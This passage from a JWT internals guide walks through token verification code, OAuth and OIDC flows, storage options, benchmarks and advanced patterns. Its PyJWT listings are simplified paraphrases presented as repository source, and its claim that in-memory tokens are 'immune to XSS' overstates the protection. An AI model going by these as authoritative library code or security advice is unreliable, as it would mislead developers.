  if (!decodedToken) {
    return done(new JsonWebTokenError('invalid token'));
  }

  const header = decodedToken.header;
  let payload = decodedToken.payload;

  // Verify signature
  if (!jws.verify(jwtString, header.alg, secretOrPublicKey)) {
    return done(new JsonWebTokenError('invalid signature'));
  }

  // Verify claims
  if (typeof payload.nbf !== 'undefined' && !options.ignoreNotBefore) {
    if (typeof payload.nbf !== 'number') {
      return done(new JsonWebTokenError('invalid nbf value'));
    }
    if (payload.nbf > clockTimestamp + (options.clockTolerance || 0)) {
      return done(new NotBeforeError('jwt not active', new Date(payload.nbf * 1000)));
    }
  }

  if (typeof payload.exp !== 'undefined' && !options.ignoreExpiration) {
    if (typeof payload.exp !== 'number') {
      return done(new JsonWebTokenError('invalid exp value'));
    }
    if (clockTimestamp >= payload.exp + (options.clockTolerance || 0)) {
      return done(new TokenExpiredError('jwt expired', new Date(payload.exp * 1000)));
    }
  }

  if (options.audience) {
    const audiences = Array.isArray(options.audience) ? options.audience : [options.audience];
    const target = Array.isArray(payload.aud) ? payload.aud : [payload.aud];

    const match = target.some(function (aud) {
      return audiences.some(function (targetAudience) {
        return targetAudience instanceof RegExp ? targetAudience.test(aud) : targetAudience === aud;
      });
    });

    if (!match) {
      return done(new JsonWebTokenError('jwt audience invalid. expected: ' + audiences.join(' or ')));
    }
  }

  if (options.issuer) {
    const invalid_issuer =
        (typeof options.issuer === 'string' && payload.iss !== options.issuer) ||
        (Array.isArray(options.issuer) && options.issuer.indexOf(payload.iss) === -1);

    if (invalid_issuer) {
      return done(new JsonWebTokenError('jwt issuer invalid. expected: ' + options.issuer));
    }
  }

  if (options.subject) {
    if (payload.sub !== options.subject) {
      return done(new JsonWebTokenError('jwt subject invalid. expected: ' + options.subject));
    }
  }

  if (options.jwtid) {
    if (payload.jti !== options.jwtid) {
      return done(new JsonWebTokenError('jwt jwtid invalid. expected: ' + options.jwtid));
    }
  }

  return done(null, payload);
};
```

### 6.2 PyJWT (Python) Architecture

**Source Repository:** https://github.com/jpadilla/pyjwt

**Core Structure:**
```
pyjwt/
├── jwt/
│   ├── __init__.py          # Main API
│   ├── api_jwt.py           # JWT encode/decode
│   ├── api_jws.py           # JWS encode/decode
│   ├── algorithms.py        # Crypto algorithms
│   ├── exceptions.py        # Custom exceptions
│   └── utils.py             # Helper functions
```

**Encoding Implementation:**
```python
# https://github.com/jpadilla/pyjwt/blob/master/jwt/api_jwt.py

import json
from typing import Any, Dict, Optional
from .algorithms import get_default_algorithms
from .exceptions import InvalidTokenError
from .utils import base64url_encode, base64url_decode

class PyJWT:
    def encode(
        self,
        payload: Dict[str, Any],
        key: str,
        algorithm: str = "HS256",
        headers: Optional[Dict[str, Any]] = None
    ) -> str:
        # Merge headers
        merged_headers = {
            "typ": "JWT",
            "alg": algorithm
        }
        if headers:
            merged_headers.update(headers)

        # Encode header
        json_header = json.dumps(
            merged_headers,
            separators=(",", ":"),
            cls=self.json_encoder
        ).encode("utf-8")

        # Encode payload
        json_payload = json.dumps(
            payload,
            separators=(",", ":"),
            cls=self.json_encoder
        ).encode("utf-8")

        # Create signing input
        segments = [
            base64url_encode(json_header),
            base64url_encode(json_payload)
        ]
        signing_input = b".".join(segments)

        # Get algorithm instance
        alg_obj = self._algorithms.get(algorithm)
        if not alg_obj:
            raise InvalidTokenError(f"Algorithm '{algorithm}' not supported")

        # Sign
        signature = alg_obj.sign(signing_input, key)

        # Append signature
        segments.append(base64url_encode(signature))

        return b".".join(segments).decode("utf-8")

    def decode(
        self,
        jwt: str,
        key: str = "",
        algorithms: Optional[list] = None,
        options: Optional[Dict[str, Any]] = None,
        audience: Optional[str] = None,
        issuer: Optional[str] = None,
        **kwargs
    ) -> Dict[str, Any]:
        # Parse token
        try:
            signing_input, crypto_segment = jwt.rsplit(".", 1)
            header_segment, payload_segment = signing_input.split(".", 1)
        except ValueError:
            raise InvalidTokenError("Not enough segments")

        # Decode header
        header = self._decode_header(header_segment)

        # Validate algorithm
        if algorithms is None:
            algorithms = ["HS256"]

        if header["alg"] not in algorithms:
            raise InvalidTokenError(f"Algorithm '{header['alg']}' not allowed")

        # Get algorithm instance
        alg_obj = self._algorithms.get(header["alg"])

        # Verify signature
        signature = base64url_decode(crypto_segment.encode("utf-8"))
        if not alg_obj.verify(signing_input.encode("utf-8"), key, signature):
            raise InvalidTokenError("Signature verification failed")

        # Decode payload
        payload = self._decode_payload(payload_segment)

        # Validate claims
        self._validate_claims(
            payload,
            options=options,
            audience=audience,
            issuer=issuer,
            **kwargs
        )

        return payload

    def _validate_claims(self, payload, **kwargs):
        import time

        now = kwargs.get("leeway", 0) + int(time.time())

        # Validate expiration
        if "exp" in payload:
            if not isinstance(payload["exp"], (int, float)):
                raise InvalidTokenError("Expiration time must be a number")
            if payload["exp"] < now:
                raise ExpiredSignatureError("Token has expired")

        # Validate not before
        if "nbf" in payload:
            if not isinstance(payload["nbf"], (int, float)):
                raise InvalidTokenError("Not Before time must be a number")
            if payload["nbf"] > now:
                raise ImmatureSignatureError("Token not yet valid")

        # Validate audience
        if kwargs.get("audience"):
            if "aud" not in payload:
                raise MissingRequiredClaimError("Token missing 'aud' claim")

            audience_claims = payload["aud"]
            if isinstance(audience_claims, str):
                audience_claims = [audience_claims]

            if kwargs["audience"] not in audience_claims:
                raise InvalidAudienceError("Invalid audience")

        # Validate issuer
        if kwargs.get("issuer"):
            if payload.get("iss") != kwargs["issuer"]:
                raise InvalidIssuerError("Invalid issuer")
```

**Algorithm Implementation (HMAC):**
```python
# https://github.com/jpadilla/pyjwt/blob/master/jwt/algorithms.py

import hashlib
import hmac

class HMACAlgorithm:
    """
    HMAC signing using SHA-2 family
    """

    def __init__(self, hash_alg):
        self.hash_alg = hash_alg

    def sign(self, msg: bytes, key: str) -> bytes:
        key_bytes = key.encode("utf-8") if isinstance(key, str) else key
        return hmac.new(key_bytes, msg, self.hash_alg).digest()

    def verify(self, msg: bytes, key: str, sig: bytes) -> bool:
        key_bytes = key.encode("utf-8") if isinstance(key, str) else key
        expected = hmac.new(key_bytes, msg, self.hash_alg).digest()

        # Constant-time comparison
        return hmac.compare_digest(sig, expected)

# Register algorithms
default_algorithms = {
    "HS256": HMACAlgorithm(hashlib.sha256),
    "HS384": HMACAlgorithm(hashlib.sha384),
    "HS512": HMACAlgorithm(hashlib.sha512),
}
```

---

<a name="7-network-protocol-integration"></a>
## 7. Network Protocol Integration

### 7.1 HTTP Authorization Header

**RFC 6750 - Bearer Token Usage:**
```
Authorization: Bearer <token>
```

**HTTP Request Example:**
```http
GET /api/users/profile HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Accept: application/json
```

**Server Extraction (Express.js):**
```javascript
function extractBearerToken(req) {
    const authHeader = req.headers.authorization;

    if (!authHeader) {
        return null;
    }

    // Format: "Bearer <token>"
    const parts = authHeader.split(' ');

    if (parts.length !== 2 || parts[0] !== 'Bearer') {
        return null;
    }

    return parts[1];
}

// Middleware
function authenticateJWT(req, res, next) {
    const token = extractBearerToken(req);

    if (!token) {
        return res.status(401).json({ error: 'No token provided' });
    }

    try {
        const payload = jwt.verify(token, process.env.JWT_SECRET);
        req.user = payload;  // Attach user info to request
        next();
    } catch (error) {
        if (error.name === 'TokenExpiredError') {
            return res.status(401).json({ error: 'Token expired' });
        }
        return res.status(403).json({ error: 'Invalid token' });
    }
}

// Usage
app.get('/api/users/profile', authenticateJWT, (req, res) => {
    // req.user contains verified payload
    res.json({
        userId: req.user.sub,
        email: req.user.email
    });
});
```

### 7.2 OAuth 2.0 Integration

**OAuth 2.0 + JWT Flow:**
```
┌─────────┐                                      ┌──────────────┐
│  Client │                                      │   Auth       │
│   App   │                                      │   Server     │
└─────────┘                                      └──────────────┘
     │                                                   │
     │  1. Authorization Request                        │
     │─────────────────────────────────────────────────>│
     │     GET /authorize?                              │
     │     response_type=code&                          │
     │     client_id=...&                               │
     │     redirect_uri=...&                            │
     │     scope=read:profile                           │
     │                                                   │
     │  2. User Login & Consent                         │
     │                                                   │
     │  3. Authorization Code                           │
     │<─────────────────────────────────────────────────│
     │     302 Redirect to:                             │
     │     https://app.com/callback?code=ABC123         │
     │                                                   │
     │  4. Token Request                                │
     │─────────────────────────────────────────────────>│
     │     POST /token                                  │
     │     grant_type=authorization_code&               │
     │     code=ABC123&                                 │
     │     client_id=...&                               │
     │     client_secret=...                            │
     │                                                   │
     │  5. Access Token (JWT) + Refresh Token           │
     │<─────────────────────────────────────────────────│
     │     {                                            │
     │       "access_token": "<JWT>",                   │
     │       "token_type": "Bearer",                    │
     │       "expires_in": 3600,                        │
     │       "refresh_token": "<opaque>",               │
     │       "scope": "read:profile"                    │
     │     }                                            │
```

**Access Token (JWT Payload):**
```json
{
  "iss": "https://auth.example.com",
  "sub": "user_123",
  "aud": "https://api.example.com",
  "exp": 1735689600,
  "iat": 1735686000,
  "scope": "read:profile write:posts",
  "client_id": "app_xyz"
}
```

**Resource Server Validation:**
```javascript
// Validate OAuth 2.0 JWT access token
function validateOAuthToken(req, res, next) {
    const token = extractBearerToken(req);

    if (!token) {
        return res.status(401).json({
            error: 'invalid_request',
            error_description: 'Missing access token'
        });
    }

    try {
        const payload = jwt.verify(token, PUBLIC_KEY, {
            algorithms: ['RS256'],
            issuer: 'https://auth.example.com',
            audience: 'https://api.example.com'
        });

        // Validate scope
        const requiredScope = 'read:profile';
        const scopes = payload.scope.split(' ');

        if (!scopes.includes(requiredScope)) {
            return res.status(403).json({
                error: 'insufficient_scope',
                error_description: `Required scope: ${requiredScope}`
            });
        }

        req.oauth = {
            userId: payload.sub,
            clientId: payload.client_id,
            scopes: scopes
        };

        next();

    } catch (error) {
        return res.status(401).json({
            error: 'invalid_token',
            error_description: error.message
        });
    }
}
```

### 7.3 OpenID Connect (OIDC)

**ID Token (JWT with identity claims):**
```json
{
  "iss": "https://accounts.example.com",
  "sub": "248289761001",
  "aud": "client_app_id",
  "exp": 1735689600,
  "iat": 1735686000,
  "nonce": "n-0S6_WzA2Mj",
  "auth_time": 1735686000,
  "name": "John Doe",
  "email": "john@example.com",
  "email_verified": true,
  "picture": "https://example.com/john/photo.jpg"
}
```

**OIDC Discovery Endpoint:**
```javascript
// /.well-known/openid-configuration
{
  "issuer": "https://auth.example.com",
  "authorization_endpoint": "https://auth.example.com/authorize",
  "token_endpoint": "https://auth.example.com/token",
  "userinfo_endpoint": "https://auth.example.com/userinfo",
  "jwks_uri": "https://auth.example.com/.well-known/jwks.json",
  "response_types_supported": ["code", "token", "id_token"],
  "subject_types_supported": ["public"],
  "id_token_signing_alg_values_supported": ["RS256", "ES256"],
  "scopes_supported": ["openid", "profile", "email"],
  "claims_supported": ["sub", "iss", "name", "email", "picture"]
}
```

**JWKS (JSON Web Key Set) Endpoint:**
```json
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "kid": "key-2025-01",
      "alg": "RS256",
      "n": "0vx7agoebGcQSuuPiLJXZp...",  // Modulus (base64url)
      "e": "AQAB"                          // Exponent (base64url = 65537)
    }
  ]
}
```

**Client-Side Verification:**
```javascript
const jwksClient = require('jwks-rsa');

const client = jwksClient({
    jwksUri: 'https://auth.example.com/.well-known/jwks.json',
    cache: true,
    cacheMaxAge: 86400000,  // 24 hours
    rateLimit: true,
    jwksRequestsPerMinute: 10
});

function getPublicKey(header, callback) {
    client.getSigningKey(header.kid, (err, key) => {
        if (err) return callback(err);

        const signingKey = key.publicKey || key.rsaPublicKey;
        callback(null, signingKey);
    });
}

// Verify ID token
jwt.verify(idToken, getPublicKey, {
    algorithms: ['RS256'],
    issuer: 'https://auth.example.com',
    audience: 'client_app_id'
}, (err, decoded) => {
    if (err) {
        console.error('Invalid ID token:', err.message);
        return;
    }

    console.log('Authenticated user:', decoded.email );
});
```

---

<a name="8-storage-mechanisms"></a>
## 8. Storage & Transport Mechanisms

### 8.1 Storage Options Comparison

**1. localStorage**
```javascript
// Store token
localStorage.setItem('access_token', jwt);

// Retrieve token
const token = localStorage.getItem('access_token');

// Remove token
localStorage.removeItem('access_token');
```

**Pros:**
- Persists across browser sessions
- Simple API
- ~5-10MB storage limit

**Cons:**
- ❌ Vulnerable to XSS attacks (JavaScript can access)
- ❌ Shared across all tabs/windows (same origin)
- ❌ No expiration mechanism
- ❌ Not sent automatically with requests

**2. sessionStorage**
```javascript
// Same API as localStorage
sessionStorage.setItem('access_token', jwt);
```

**Pros:**
- Isolated per tab/window
- Cleared when tab closes
- Simple API

**Cons:**
- ❌ Still vulnerable to XSS
- ❌ Lost on tab close
- ❌ Not sent automatically with requests

**3. HttpOnly Cookies**
```javascript
// Server sets cookie
res.cookie('access_token', jwt, {
    httpOnly: true,      // Not accessible via JavaScript
    secure: true,        // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 3600000,     // 1 hour
    path: '/',
    domain: '.example.com'
});

// Browser automatically sends with requests
// No client-side code needed!
```

**Pros:**
- ✅ Immune to XSS (JavaScript cannot access)
- ✅ Automatically sent with requests
- ✅ Built-in expiration
- ✅ Can scope by domain/path

**Cons:**
- Requires CSRF protection
- ~4KB size limit per cookie
- Sent with every request (including static assets)

**4. Memory Storage (SPA)**
```javascript
class TokenManager {
    constructor() {
        this.accessToken = null;
        this.refreshToken = null;
    }

    setTokens(access, refresh) {
        this.accessToken = access;
        this.refreshToken = refresh;
    }

    getAccessToken() {
        return this.accessToken;
    }

    clear() {
        this.accessToken = null;
        this.refreshToken = null;
    }
}

const tokenManager = new TokenManager();
```

**Pros:**
- ✅ Immune to XSS (not in DOM storage)
- ✅ Cleared on page reload (security)

**Cons:**
- ❌ Lost on page refresh
- ❌ Requires refresh token flow on reload

### 8.2 Secure Token Transmission

**HTTPS Requirement:**
```
Client ─── TLS 1.3 ───> Server
      encrypted tunnel

TLS Handshake:
1. ClientHello (supported ciphers)
2. ServerHello (chosen cipher + certificate)
3. Key Exchange (ECDHE for forward secrecy)
4. Finished (encrypted with session keys)

HTTP Request encrypted with AES-256-GCM:
  GET /api/data
  Authorization: Bearer <JWT>
```

**Token in URL Query Parameters (AVOID):**
```
❌ GET /api/data?token=eyJhbGci...

Risks:
- Logged in server access logs
- Stored in browser history
- Leaked via Referer header
- Cached by proxies
```

**Proper Transmission:**
```javascript
// ✅ Authorization header
fetch('https://api.example.com/data', {
    headers: {
        'Authorization': `Bearer ${token}`
    }
});

// ✅ HttpOnly cookie (automatic)
fetch('https://api.example.com/data', {
    credentials: 'include'  // Send cookies
});
```

---

<a name="9-performance-characteristics"></a>
## 9. Performance Characteristics & Optimization

### 9.1 Signature Verification Benchmarks

**Test Environment:**
- CPU: Intel i7-9700K @ 3.6GHz
- Memory: 16GB DDR4
- OS: Linux 5.15

**Results (operations per second):**
```
Algorithm | Sign      | Verify    | Signature Size
----------|-----------|-----------|---------------
HS256     | 1,000,000 | 1,000,000 | 32 bytes
HS384     | 850,000   | 850,000   | 48 bytes
HS512     | 750,000   | 750,000   | 64 bytes
RS256     | 2,000     | 50,000    | 256 bytes
RS384     | 1,800     | 45,000    | 256 bytes
RS512     | 1,600     | 40,000    | 256 bytes
ES256     | 10,000    | 5,000     | 64 bytes
ES384     | 8,000     | 4,000     | 96 bytes
ES512     | 7,000     | 3,500     | 132 bytes
```

**Benchmark Code:**
```javascript
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const { performance } = require('perf_hooks');

function benchmark(algorithm, secret, iterations = 10000) {
    const payload = { sub: '12345', name: 'Test User' };

    // Signing benchmark
    const signStart = performance.now();
    for (let i = 0; i < iterations; i++) {
        jwt.sign(payload, secret, { algorithm });
    }
    const signEnd = performance.now();
    const signOpsPerSec = iterations / ((signEnd - signStart) / 1000);

    // Verification benchmark
    const token = jwt.sign(payload, secret, { algorithm });
    const verifyStart = performance.now();
    for (let i = 0; i < iterations; i++) {
        jwt.verify(token, secret, { algorithms: [algorithm] });
    }
    const verifyEnd = performance.now();
    const verifyOpsPerSec = iterations / ((verifyEnd - verifyStart) / 1000);

    return {
        algorithm,
        signOpsPerSec: Math.round(signOpsPerSec),
        verifyOpsPerSec: Math.round(verifyOpsPerSec)
    };
}

// Test HMAC
const hmacSecret = crypto.randomBytes(32);
console.log(benchmark('HS256', hmacSecret));

// Test RSA
const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048
});
console.log(benchmark('RS256', privateKey));
```

### 9.2 Payload Size Impact

**Token Size Growth:**
```
Payload Size | Token Size | Base64 Overhead
-------------|------------|----------------
100 bytes    | ~200 bytes | ~33%
500 bytes    | ~750 bytes | ~33%
1 KB         | ~1.5 KB    | ~33%
5 KB         | ~7.5 KB    | ~33%
```

**Network Impact:**
```
Requests/day: 1,000,000
Token size: 1 KB

Total data transfer = 1,000,000 * 1 KB * 2 (request + response)
                    = 2 GB/day
                    = 60 GB/month
```

**Optimization Strategies:**
```javascript
// ❌ BAD: Excessive data in token
{
  "sub": "user_123",
  "user_profile": {
    "name": "John Doe",
    "email": "john@example.com",
    "address": "123 Main St...",
    "preferences": { /* ... */ },
    "history": [ /* ... */ ]
  },
  "permissions": [ /* 50+ permissions */ ]
}

// ✅ GOOD: Minimal claims
{
  "sub": "user_123",
  "role": "admin",
  "permissions": "admin:*"  // Use permission notation
}

// Client fetches full profile separately if needed
fetch('/api/users/me', {
    headers: { 'Authorization': `Bearer ${token}` }
});
```

### 9.3 Caching Strategies

**Public Key Caching:**
```javascript
class KeyCache {
    constructor(ttl = 3600000) {  // 1 hour TTL
        this.cache = new Map();
        this.ttl = ttl;
    }

    async getKey(kid, fetcher) {
        const cached = this.cache.get(kid);

        if (cached && Date.now() < cached.expiresAt) {
            return cached.key;
        }

        // Fetch new key
        const key = await fetcher(kid);

        this.cache.set(kid, {
            key,
            expiresAt: Date.now() + this.ttl
        });

        return key;
    }

    invalidate(kid) {
        this.cache.delete(kid);
    }

    clear() {
        this.cache.clear();
    }
}

// Usage
const keyCache = new KeyCache();

async function verifyWithCaching(token) {
    const header = jwt.decode(token, { complete: true }).header;

    const publicKey = await keyCache.getKey(header.kid, async (kid) => {
        const response = await fetch(`https://auth.com/.well-known/jwks.json`);
        const jwks = await response.json();
        const key = jwks.keys.find(k => k.kid === kid);
        return jwkToPem(key);
    });

    return jwt.verify(token, publicKey, { algorithms: ['RS256'] });
}
```

---

<a name="10-advanced-patterns"></a>
## 10. Advanced Patterns & Edge Cases

### 10.1 Multi-Tenancy with JWT

**Tenant Isolation:**
```javascript
// Token with tenant claim
{
  "sub": "user_123",
  "tenant_id": "org_abc",
  "tenant_role": "admin",
  "permissions": ["read:reports", "write:reports"]
}

// Middleware enforcing tenant isolation
function enforceTenantIsolation(req, res, next) {
    const token = verifyToken(req);
    const requestedTenant = req.params.tenantId;

    if (token.tenant_id !== requestedTenant) {
        return res.status(403).json({
            error: 'Access denied: tenant mismatch'
        });
    }

    req.tenant = token.tenant_id;
    req.tenantRole = token.tenant_role;
    next();
}

// Route
app.get('/api/tenants/:tenantId/reports',
    enforceTenantIsolation,
    (req, res) => {
        // req.tenant is verified and safe to use
        const reports = db.reports.find({ tenant_id: req.tenant });
        res.json(reports);
    }
);
```

### 10.2 Hierarchical Permissions

**Permission Encoding:**
```javascript
// Token with hierarchical permissions
{
  "sub": "user_123",
  "permissions": [
    "org:acme:project:alpha:read",
    "org:acme:project:alpha:write",
    "org:acme:project:beta:read"
  ]
}

// Permission checker
class PermissionChecker {
    constructor(permissions) {
        this.permissions = new Set(permissions);
    }

    can(requiredPermission) {
        // Exact match
        if (this.permissions.has(requiredPermission)) {
            return true;
        }

        // Wildcard match
        const parts = requiredPermission.split(':');
        for (let i = parts.length; i > 0; i--) {
            const pattern = parts.slice(0, i).join(':') + ':*';
            if (this.permissions.has(pattern)) {
                return true;
            }
        }

        return false;
    }
}

// Middleware
function requirePermission(permission) {
    return (req, res, next) => {
        const token = verifyToken(req);
        const checker = new PermissionChecker(token.permissions);

        if (!checker.can(permission)) {
            return res.status(403).json({
                error: `Missing permission: ${permission}`
            });
        }

        next();
    };
}

// Usage
app.delete('/api/projects/:projectId/reports/:reportId',
    requirePermission('org:acme:project:alpha:write'),
    (req, res) => {
        // User has required permission
    }
);
```

### 10.3 Token Binding

**Binding JWT to TLS certificate:**
```javascript
// Server generates token bound to client certificate
function generateBoundToken(userId, clientCertThumbprint) {
    return jwt.sign({
        sub: userId,
        cnf: {  // Confirmation claim (RFC 8705)
            'x5t#S256': clientCertThumbprint  // SHA-256 thumbprint
        }
    }, secret);
}

// Verification
function verifyBoundToken(req) {
    const token = extractToken(req);
    const payload = jwt.verify(token, secret);

    // Extract client certificate from TLS
    const clientCert = req.connection.getPeerCertificate();
    const certThumbprint = crypto
        .createHash('sha256')
        .update(clientCert.raw)
        .digest('base64url');

    // Verify binding
    if (payload.cnf['x5t#S256'] !== certThumbprint) {
        throw new Error('Token not bound to this client certificate');
    }

    return payload;
}
```

### 10.4 Encrypted JWTs (JWE)

**JSON Web Encryption Structure:**
```
[PROTECTED_HEADER].[ENCRYPTED_KEY].[IV].[CIPHERTEXT].[TAG]
```

**Example:**
```javascript
const jose = require('node-jose');

async function createJWE(payload, publicKey) {
    const keystore = jose.JWK.createKeyStore();
    const key = await keystore.add(publicKey, 'pem');

    const encrypted = await jose.JWE.createEncrypt(
        {
            format: 'compact',
            contentAlg: 'A256GCM',  // AES-256-GCM
            fields: {
                alg: 'RSA-OAEP-256'  // Key encryption algorithm
            }
        },
        key
    )
    .update(JSON.stringify(payload))
    .final();

    return encrypted;
}

async function decryptJWE(jwe, privateKey) {
    const keystore = jose.JWK.createKeyStore();
    const key = await keystore.add(privateKey, 'pem');

    const decrypted = await jose.JWE.createDecrypt(keystore).decrypt(jwe);
    return JSON.parse(decrypted.payload.toString());
}
```

---

## Conclusion: JWT System Model

**JWT exists at the intersection of:**

1. **Cryptography**: HMAC, RSA, ECDSA primitives
2. **Encoding**: Base64URL transformation pipeline
3. **Networking**: HTTP bearer authentication, OAuth 2.0
4. **Security**: Constant-time operations, timing attack mitigation
5. **Distributed Systems**: Stateless authentication, horizontal scaling

**Core Invariants:**
- Signature verification MUST use constant-time comparison
- Algorithm MUST be validated against allowlist
- Claims (exp, nbf, aud) MUST be verified
- Secrets MUST be cryptographically strong (256+ bits)
- Transport MUST use TLS 1.2+

**Runtime Behavior:**
```
Token Generation: O(1) signing operation
Token Verification: O(1) signature check + O(n) claim validation
Storage: O(token_size) per request
Network: ~1.5KB overhead per request (typical)
```

This is the complete internal model of JWT—from bit-level encoding to distributed authentication flows.
